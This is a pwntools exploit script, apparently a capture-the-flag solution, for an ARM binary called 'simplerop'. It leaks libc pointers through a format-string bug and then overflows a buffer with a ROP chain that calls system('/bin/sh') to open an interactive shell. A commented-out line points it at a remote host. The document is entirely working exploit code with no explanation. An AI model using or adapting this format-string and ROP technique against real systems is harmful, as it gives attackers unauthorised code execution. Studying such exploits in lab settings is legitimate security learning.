from pwn import *

MAX_LENGTH_NAME = 98
context.arch = 'arm'
#r = remote('192.168.51.12', 10002)
r = process('./simplerop')
elf = ELF('lib/libc.so.6')


binsh_offset = int(elf.search('/bin/sh').next())
system_offset = int(elf.symbols['system'])
stdin_offset = int(elf.symbols['_IO_2_1_stdin_'])
stdout_offset = int(elf.symbols['_IO_2_1_stdout_'])
pop_offset = int(0x00042a4f)	#using ROPshell

bss_addr = p32(0x21040)

print "/bin/sh offset : " + hex(binsh_offset)
print "<system> offset : " + hex(system_offset)
print "stdin@GLIBC offset : " + hex(stdin_offset)
print "stdout@GLIBC offset : " + hex(stdout_offset)
print "pop {r0, r1, r2, r3, r4, r6, r7, pc} offset : " + hex(pop_offset)

name = "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s______AAAA" + bss_addr + "BBBB"

r.recvuntil("What is your name? \n")

r.sendline(name)

#

r.recvuntil('0x41414141')


bss_values = r.recvuntil('______')[0:12]
stdin_addr = u32(bss_values[0:4])
stdout_addr = u32(bss_values[4:8])

print hex(stdin_addr)
print hex(stdin_offset)
print hex(stdout_addr)
print hex(stdout_offset)

base_addr = stdin_addr - stdin_offset
assert base_addr == (stdout_addr - stdout_offset)

binsh_addr = binsh_offset + base_addr
system_addr = system_offset + base_addr
pop_addr = pop_offset + base_addr

print "Base address: " + hex(base_addr)

r.recvuntil('leave a message:')

exploit = "a" * 0x68
exploit += p32(pop_addr)
exploit += p32(binsh_addr)
exploit += p32(0x0)
exploit += p32(0x0)
exploit += p32(0x0)
exploit += p32(0x0)
exploit += p32(0x0)
exploit += p32(0x0)
exploit += p32(system_addr)

r.sendline(exploit)

r.interactive()

